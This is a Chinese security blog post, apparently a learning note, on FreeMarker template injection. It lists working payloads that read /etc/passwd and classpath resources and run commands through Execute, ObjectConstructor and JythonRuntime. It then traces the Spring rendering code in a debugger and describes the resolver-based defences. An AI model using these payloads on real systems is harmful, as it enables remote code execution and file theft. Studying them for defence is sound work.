@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="FreeMarker模版注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FreeMarker模版注入">
+<meta property="og:url" content="https://baicany.github.io/2023/01/11/FreeMarker/index.html">
+<meta property="og:site_name" content="baicany">
+<meta property="og:description" content="FreeMarker模版注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240111213129223.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240111214458946.png">
+<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240111215324067.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240111215832404.png">
+<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240111222529042.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240111222542573.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240111223121932.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240111225031735.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240112152614977.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240112160206798.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240112160458594.png">
+<meta property="og:image" content="https://baicany.github.io/baicany/images/image-20240112160710680.png">
+<meta property="article:published_time" content="2023-01-11T04:16:01.000Z">
+<meta property="article:modified_time" content="2024-01-16T14:10:57.329Z">
+<meta property="article:author" content="baicany">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baicany.github.io/baicany/images/image-20240111213129223.png">
+
+
+<link rel="canonical" href="https://baicany.github.io/2023/01/11/FreeMarker/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2023/01/11/FreeMarker/","path":"2023/01/11/FreeMarker/","title":"FreeMarker模版注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>FreeMarker模版注入 | baicany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baicany</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome my world !</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFFreeMaerker"><span class="nav-number">1.</span> <span class="nav-text">什么是FreeMaerker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">内置函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#new"><span class="nav-number">3.1.</span> <span class="nav-text">new</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#api"><span class="nav-number">3.2.</span> <span class="nav-text">api</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">4.1.</span> <span class="nav-text">防御措施</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baicany"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">baicany</p>
+  <div class="site-description" itemprop="description">web小菜狗一枚</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2023/01/11/FreeMarker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="baicany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baicany">
+      <meta itemprop="description" content="web小菜狗一枚">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="FreeMarker模版注入 | baicany">
+      <meta itemprop="description" content="FreeMarker模版注入">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          FreeMarker模版注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-11 12:16:01" itemprop="dateCreated datePublished" datetime="2023-01-11T12:16:01+08:00">2023-01-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-01-16 22:10:57" itemprop="dateModified" datetime="2024-01-16T22:10:57+08:00">2024-01-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">FreeMarker模版注入</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>好久没更了o(╥﹏╥)o考试,去武汉打了比赛了一趟,辣的热干面不错,纯麻酱我是真吃不了.也有去跟小东西爆金币去了。</p>
+<h1 id="什么是FreeMaerker"><a href="#什么是FreeMaerker" class="headerlink" title="什么是FreeMaerker"></a>什么是FreeMaerker</h1><p><a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/">什么是 FreeMarker? - FreeMarker 中文官方参考手册 (foofun.cn)</a></p>
+<p>FreeMarker 是一款 <em>模板引擎</em>： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
+<p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p>
+<p>这种方式通常被称为 <a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/gloss.html#gloss.MVC">MVC (模型 视图 控制器) 模式</a>，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。</p>
+<p>总的来说，模板和数据模型是FreeMarker来生成输出(比如第一个展示的HTML)所必须的：</p>
+<p>模板 + 数据模型 &#x3D; 输出</p>
+<p>文本：包括 HTML 标签与静态文本等静态内容，该部分内容会原样输出<br>插值：语法为 <code>$&#123;&#125;</code>， 这部分的输出会被模板引擎计算的值来替换。<br>指令标签：<code>&lt;# &gt;</code>或者 <code>&lt;@ &gt;</code>。如果指令为系统内建指令，如assign时，用<code>&lt;# &gt;</code>。如果指令为用户指令，则用<code>&lt;@ &gt;</code>。利用中最常见的指令标签为<code>&lt;#assign&gt;</code>，该指令可创建变量。<br>注释：由 <code>&lt;#--</code>和<code>--&gt;</code>表示，注释部分的内容会 FreeMarker 忽略</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>[<a target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CodeReview/JavaSec-Code/SSTI/]">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CodeReview/JavaSec-Code/SSTI/]</a>(<a target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java</a> 代码审计&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;SSTI&#x2F;)</p>
+<h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><p>FreeMarker 提供了大量的内建函数，用于拓展模板语言的功能，大大增强了模板语言的可操作性。具体用法为<code>variable_name?method_name</code>。</p>
+<h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><p>可创建任意实现了<code>TemplateModel</code>接口的Java对象，同时还可以触发没有实现 <code>TemplateModel</code>接口的类的静态初始化块。<br>以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承<code>TemplateModel</code>接口的<code>freemarker.template.utility.JythonRuntime</code>和<code>freemarker.template.utility.Execute</code>。</p>
+<h2 id="api"><a href="#api" class="headerlink" title="api"></a>api</h2><p>如果value本身支持这个额外的特性， <code>value?api</code> 提供访问 <code>value</code> 的API (通常是 Java API)，比如 <code>value?api.someJavaMethod()</code>， 当需要调用对象的Java方法时，这种方式很少使用， 但是 FreeMarker 揭示的value的简化视图的模板隐藏了它，也没有相等的内建函数。 例如，当有一个 <code>Map</code>，并放入数据模型 (使用默认的对象包装器)，模板中的 <code>myMap.myMethod()</code> 基本上翻译成Java的 <code>((Method) myMap.get(&quot;myMethod&quot;)).invoke(...)</code>，因此不能调用 <code>myMethod</code>。如果编写了 <code>myMap?api.myMethod()</code> 来代替，那么就是Java中的 <code>myMap.myMethod()</code>。</p>
+<p>当<code>api_builtin_enabled</code>为true时才可使用api函数，而该配置在<strong>2.3.22版本</strong>之后默认为false。</p>
+<p>poc1:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">访问类路径中的资源</span><br><span class="line">&lt;#assign is=object?api.class.getResourceAsStream(<span class="string">&quot;/Test.class&quot;</span>)&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>poc2:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">读取系统任意文件</span><br><span class="line">&lt;#assign uri=object?api.class.getResource(<span class="string">&quot;/&quot;</span>).toURI()&gt;</span><br><span class="line">&lt;#assign input=uri?api.create(<span class="string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;</span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>poc3:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">任意代码执行</span><br><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt;</span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt;</span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt;</span><br><span class="line">&lt;#assign instance=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;our.desired.class&quot;</span>))&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt;</span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt;</span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt;</span><br><span class="line">&lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt;</span><br><span class="line">$&#123;ex(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc4:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;whoami&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc5:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os.system(<span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt; $&#123; ex(<span class="string">&quot;Calc&quot;</span>) &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先看看hello.ftl访问hello路由,</p>
+<p>在<code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>打断点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">this</span>.canHandle(viewName, locale)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先判断当前当前处理器能解析我们特定的路由,viewname是我们想要访问的路由，由于不满足下方的两个条件，调用父类的createView方法</p>
+<p>最后就会调用到</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">return</span> <span class="keyword">super</span>.<span class="title">createView</span><span class="params">(viewName, locale)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进发现会调用buildView方法</p>
+<p>继续到<code>AbstractTemplateView view = (AbstractTemplateView)super.buildView(viewName);</code></p>
+<p>在getviewclass中会获取到FreeMarkerView类，然后利用instantiateClass方法对其进行初始化，紧接着设置相应的模板文件名称属性，并将其加入到map中，随后返回该View类，回到loadView方法，调用了checkResource方法<br><img src="https://baicany.github.io/baicany/images/image-20240111213129223.png" alt="image-20240111213129223"></p>
+<p>FreeMarkerView这个翻之前调用栈发现之前方法哪里会遍历所有viewResolves,再往下调去去创造视图的</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240111214458946.png" alt="image-20240111214458946"></p>
+<p>然后跟到view.checkResource,里面有一个getTemplate方法,跟进</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240111215324067.png" alt="image-20240111215324067"></p>
+<p>跟进到cache.getTemplate方法</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> MaybeMissingTemplate maybeTemp = cache.getTemplate(<span class="keyword">name</span>, locale, customLookupCondition, encoding, parseAsFTL);</span><br></pre></td></tr></table></figure>
+
+<p>而且<code>putTemplate</code>设置模板的时候，也会将至存储到cache中。这里就不分析了</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240111215832404.png" alt="image-20240111215832404"></p>
+<p>首先进行了一些参数的检查，templateNameFormat.normalizeRootBasedName获取文件的相对路径，跟进getTemplateInternal方法</p>
+<p>前面是一些基本属性的判断，步入到lookupTemplate方法，跟到下图为止</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newLookupResult = lookupTemplate(name, locale, customLookupCondition);</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240111222529042.png" alt="image-20240111222529042"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">lookupWithAcquisitionStrategy</span>(path);</span><br></pre></td></tr></table></figure>
+
+<p>代码会先拼接<code>_zh_CN</code>,再寻找未拼接<code>_zh_CN</code>的模板名，调用<code>this.findTemplateSource(path)</code>获取模板实例。</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240111222542573.png" alt="image-20240111222542573"></p>
+<p>这里并没有所以没有找到,经过截取字符串后,在进入循环就获取到了handle执行返回的模板视图实例。</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240111223121932.png" alt="image-20240111223121932"></p>
+<p><code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>流程</p>
+<p>handle 执行完成后调用<br><code>this.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);</code>进行模板解析。调用<code>view.render(mv.getModelInternal(), request, response);</code></p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240111225031735.png" alt="image-20240111225031735"></p>
+<p>-&gt;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processTemplate</span><span class="params">(Template template, SimpleHash model, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, TemplateException &#123;</span><br><span class="line">    template.process(model, response.getWriter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>-&gt;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">(Object dataModel, Writer out)</span></span><br><span class="line"><span class="keyword">throws</span> TemplateException, IOException &#123;</span><br><span class="line">    createProcessingEnvironment(dataModel, out, <span class="literal">null</span>).process();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>-&gt;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visit(getTemplate().getRootTreeNode());</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(TemplateElement element)</span> <span class="keyword">throws</span> IOException, TemplateException &#123;</span><br><span class="line">    <span class="comment">// ATTENTION: This method body is manually &quot;inlined&quot; into visit(TemplateElement[]); keep them in sync!</span></span><br><span class="line">    pushElement(element);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TemplateElement[] templateElementsToVisit = element.accept(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (templateElementsToVisit != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (TemplateElement el : templateElementsToVisit) &#123;</span><br><span class="line">                <span class="keyword">if</span> (el == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;  <span class="comment">// Skip unused trailing buffer capacity </span></span><br><span class="line">                &#125;</span><br><span class="line">                visit(el);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先将这个element也就是模板文件内容压入一个堆栈，而后按${}对内容进行分割</p>
+<p>当循环到第6个属性，也就是Excute类的时候，递归调用visit方法，往后面走，</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240112152614977.png" alt="image-20240112152614977"></p>
+<p>跟进rosolve,发现是通过ClassUtil.forName(className);来反射创建对象</p>
+<p>然后来看看为什么${value(“calc”)}为什么传入的是exec()方法了,中间就没写了,调试到Exprssion类的eval方法</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240112160206798.png" alt="image-20240112160206798"></p>
+<p>继续跟进,发现是targetMethod是我们的value的对象也就是Execute,这里会调用它的exec方法</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240112160458594.png" alt="image-20240112160458594"></p>
+<p>而exec方法,这里就能命令执行了</p>
+<p><img src="https://baicany.github.io/baicany/images/image-20240112160710680.png" alt="image-20240112160710680"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：<br>1、UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。<br>2、SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。<br>3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。<br>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p>
+<p><strong>漏洞修复</strong></p>
+<p>也就是safe里面了</p>
